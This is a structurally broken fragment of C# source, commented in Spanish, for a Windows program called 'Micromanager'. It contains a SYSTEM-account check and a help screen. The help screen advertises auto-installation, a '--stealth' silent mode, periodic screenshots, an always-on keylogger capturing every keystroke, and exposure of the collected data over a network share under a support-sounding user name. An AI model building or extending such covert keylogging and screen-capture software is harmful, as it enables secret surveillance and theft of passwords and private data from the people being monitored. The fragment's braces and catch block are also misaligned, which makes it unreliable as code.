        return false;
    }
}

static bool IsSystemAccount()
{
    try
    {
        using WindowsIdentity identity = WindowsIdentity.GetCurrent();
        // SYSTEM account tiene el SID: S-1-5-18
        return identity.User?.Value == "S-1-5-18" || 
               identity.Name.Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase);
    }
    catch
    {
        return false;
    }
}

static void ShowHelp()
{
    Console.WriteLine("=====================================");
    Console.WriteLine("   MICROMANAGER - Sistema de Monitoreo");
    Console.WriteLine("=====================================");
    Console.WriteLine("");
    Console.WriteLine("USO:");
    Console.WriteLine("  Micromanager.exe [opciones]");
    Console.WriteLine("");
    Console.WriteLine("OPCIONES:");
    Console.WriteLine("");
    Console.WriteLine("  Instalación y ejecución:");
    Console.WriteLine("    (sin parámetros)              Auto-instala y ejecuta con config predeterminada");
    Console.WriteLine("    --stealth                     Ejecuta en modo silencioso");
    Console.WriteLine("");
    Console.WriteLine("  Configuración:");
    Console.WriteLine("    --screenshot-interval N       Intervalo de capturas en segundos (default: 30)");
    Console.WriteLine("    --screenshot N                Alias corto");
    Console.WriteLine("    --cleanup-days N              Días para mantener datos antiguos (0 = no limpiar)");
    Console.WriteLine("    --cleanup N                   Alias corto");
    Console.WriteLine("    --shared-folder               Habilitar carpeta compartida de red (requiere admin)");
    Console.WriteLine("    --shared-user USERNAME        Usuario para carpeta compartida (default: SoporteManager)");
    Console.WriteLine("");
    Console.WriteLine("  Nota: El keylog captura TODAS las teclas en tiempo real (siempre activo)");
    Console.WriteLine("  Nota: Con --shared-folder se pedirá contraseña para el usuario de acceso");
    Console.WriteLine("");
    Console.WriteLine("  Control:");
    Console.WriteLine("    --disable                     Detiene todas las instancias");
    Console.WriteLine("    --clean                       Elimina todo (desinstalación completa)");
    Console.WriteLine("    --debug                       Muestra información de diagnóstico detallada");
    Console.WriteLine("    --help, -h                    Muestra esta ayuda");
    Console.WriteLine("");
    Console.WriteLine("EJEMPLOS:");
    Console.WriteLine("");
    Console.WriteLine("  Auto-instalación simple:");
    Console.WriteLine("    Micromanager.exe");
    Console.WriteLine("");
    Console.WriteLine("  Con intervalos personalizados:");
    Console.WriteLine("    Micromanager.exe --screenshot 60");
    Console.WriteLine("    Micromanager.exe --stealth --screenshot-interval 120");
    Console.WriteLine("");
    Console.WriteLine("  Con limpieza automática (borrar datos > 7 días):");
    Console.WriteLine("    Micromanager.exe --cleanup-days 7");
    Console.WriteLine("    Micromanager.exe --screenshot 30 --cleanup 7");
    Console.WriteLine("");
    Console.WriteLine("  Con carpeta compartida de red:");
    Console.WriteLine("    Micromanager.exe --shared-folder");
    Console.WriteLine("    Micromanager.exe --screenshot 5 --cleanup 30 --shared-folder");
    Console.WriteLine("    Micromanager.exe --shared-folder --shared-user MiUsuario");
    Console.WriteLine("");
    Console.WriteLine("  (La carpeta compartida pedirá contraseña para el usuario de acceso)");
    Console.WriteLine("");
    Console.WriteLine("  Detener todo:");
    Console.WriteLine("    Micromanager.exe --disable");
    Console.WriteLine("");
    Console.WriteLine("  Desinstalar completamente:");
    Console.WriteLine("    Micromanager.exe --clean");
    Console.WriteLine("");
    Console.WriteLine("UBICACIONES:");
    Console.WriteLine($"  Instalación:       {Configuration.InstallPath}");
    Console.WriteLine($"  Datos:             {Configuration.DataPath}");
    Console.WriteLine($"  Carpeta de red:    \\\\[PC]\\{Configuration.ShareName}");
    Console.WriteLine("");
        }
    }
    catch (Exception ex)
    {
    Console.WriteLine("=====================================");
    Console.WriteLine("   ERROR NO MANEJADO");
    Console.WriteLine("=====================================");
    Console.WriteLine($"Excepción: {ex.GetType().Name}");
    Console.WriteLine($"Mensaje: {ex.Message}");
    Console.WriteLine($"StackTrace: {ex.StackTrace}");
    Console.WriteLine("");
    Console.WriteLine("Presione cualquier tecla para salir...");
    Console.ReadKey();
    Environment.Exit(1);
}
